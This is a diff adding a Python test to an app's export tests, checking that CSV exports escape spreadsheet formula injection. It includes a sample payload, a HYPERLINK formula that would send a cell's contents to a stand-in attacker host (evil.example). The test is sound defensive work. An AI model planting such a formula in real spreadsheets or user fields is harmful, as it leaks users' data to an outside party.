@@ -2,6 +2,7 @@
 частями; только свое и без секретов — значения секретов фикстуры ищутся в байтах файла
 (у ZIP — в распакованных файлах)."""
 
+import csv
 import io
 import json
 import zipfile
@@ -31,7 +32,7 @@ from app.services.notifications import notify
 from app.services.sessions import utcnow
 from tests.analysis_helpers import set_own_key
 from tests.claude_mock import OTHER_KEY
-from tests.helpers_admin import Signed, signed_in
+from tests.helpers_admin import Signed, admin_signed_in, signed_in
 from tests.helpers_bets import BetMaker, LegSpec
 from tests.support import DEFAULT_PASSWORD, ClientFactory, LoginFn, MadeUser, UserFactory
 
@@ -197,6 +198,60 @@ async def test_csv_zip_export(
     assert "stranger@example.com" not in text and "Book-theirs" not in text
     _assert_no_secrets(contents, mine, await _session_hashes(db, member.id))
     _assert_no_secrets(contents, theirs, [])
+
+
+def _csv_table(archive: zipfile.ZipFile, name: str) -> list[dict[str, str]]:
+    text = archive.read(name).decode("utf-8-sig")
+    return list(csv.DictReader(io.StringIO(text)))
+
+
+async def _zip(signed: Signed) -> zipfile.ZipFile:
+    response = await signed.client.get("/api/me/export", params={"format": "csv"})
+    assert response.status_code == 200, response.text
+    return zipfile.ZipFile(io.BytesIO(response.content))
+
+
+FORMULA = '=HYPERLINK("https://evil.example/?d="&A2,"open")'
+
+
+async def test_csv_export_text_is_not_formula(
+    make_client: ClientFactory, make_user: UserFactory, login: LoginFn
+) -> None:
+    """Чужой текст в своей выгрузке не становится формулой таблицы: имя участника в
+    заголовке уведомления администратора, сообщение администратора у участника. Числа
+    (отрицательные тоже) не трогаем."""
+    admin = await admin_signed_in(make_client, make_user, login)
+    member = await signed_in(make_client, make_user, login, ip="10.0.0.2", ai_mode="own")
+    renamed = await member.client.patch("/api/me", json={"display_name": FORMULA})
+    assert renamed.status_code == 200, renamed.text
+    asked = await member.client.post("/api/me/ai-mode/return-request")
+    assert asked.status_code < 300, asked.text
+    sent = await admin.client.post(
+        "/api/admin/messages", json={"text": "=1+1", "user_id": member.id, "preview": False}
+    )
+    assert sent.status_code == 201, sent.text
+
+    def cells(archive: zipfile.ZipFile) -> list[str]:
+        return [
+            cell
+            for name in archive.namelist()
+            if name.endswith(".csv")
+            for row in _csv_table(archive, name)
+            for cell in row.values()
+        ]
+
+    theirs = await _zip(admin)
+    titles = [row["title"] for row in _csv_table(theirs, "notifications.csv")]
+    assert "'" + FORMULA + " просит вернуть ключ администратора" in titles
+    mine = await _zip(member)
+    assert _csv_table(mine, "profile.csv")[0]["display_name"] == "'" + FORMULA
+    assert "=1+1" in mine.read("notifications.csv").decode("utf-8-sig")
+    for archive in (theirs, mine):
+        assert not [cell for cell in cells(archive) if cell.startswith(("=", "+", "@"))]
+        # «-» в начале — только у чисел
+        for cell in cells(archive):
+            if cell.startswith("-"):
+                Decimal(cell)
 
 
 async def test_export_goes_in_parts(
